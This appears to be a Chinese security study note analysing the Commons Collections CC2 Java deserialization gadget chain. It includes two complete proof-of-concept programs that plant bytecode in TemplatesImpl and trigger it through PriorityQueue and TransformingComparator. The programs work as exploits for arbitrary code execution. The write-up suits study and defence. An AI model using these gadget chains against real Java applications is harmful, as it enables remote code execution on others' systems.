# 分析版本

Commons Collections 4.0

JDK 8u65

环境配置参考[JAVA安全初探(三):CC1链全分析](https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2bxCw67o7KKG=z4D&amp;alichlgref=https://www.google.com/)

# 分析过程

CC2是在CC4的基础上做了一点改动，和之前CC3结合CC1 InvokerTransformer一样的。

因为TemplatesImpl是可序列化的，利用反射把TemplatesImpl参数控制好之后，直接用InvokerTransformer执行TemplatesImpl.newTransformer，就可以调用defineClass，实现任意命令执行了。（不再使用TrAXFilter）

![image-20240708153515226](https://s2.loli.net/2024/07/08/3UrjzYGQxihlpwe.png)

更新Poc

```java
public class cc2 {
    public static void main(String[] args) throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());


        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(1);

        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, chainedTransformer);

        //cc4.serialize(priorityQueue);
        cc4.unserialize("ss.ser");

    }
}
```



## 补充

关于templates传入还有一种方法就是不用new ConstantTransformer(templates)传值，而是用priorityQueue.add(templates);

```java
public class cc2 {
    public static void main(String[] args) throws Exception {
        //CC2
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);


        ///Class transformingComparatorClass = TransformingComparator.class;  //也可以
        Class transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        //cc4.serialize(priorityQueue);
        cc4.unserialize("ss.ser");

    }
}
```

priorityQueue.add(templates);会执行到下图方法

此方法是直接给transformer方法参数传值templates（CC1中ConstantTransformer的引入是为了解决无法给InvokerTransformer方法传值的问题，而这里是可以控制传值，所以我们可以不用ConstantTransformer）

![image-20240708170653485](https://s2.loli.net/2024/07/08/jT7n3krJbNB945X.png)

![image-20240708173755568](https://s2.loli.net/2024/07/08/tYIW5AkyaUfe6cu.png)

还存在一个问题如果，Poc这样传值会发现，无法弹出计算器

```java
    priorityQueue.add(1);
    priorityQueue.add(templates);
```

可以对比上图正确的Poc，下图代码执行时去找1的newTransformer，找不到抛出了错误。在执行第二行代码之前，程序就结束了。

![image-20240708174011165](https://s2.loli.net/2024/07/08/lHZyWwsNhG5ngzj.png)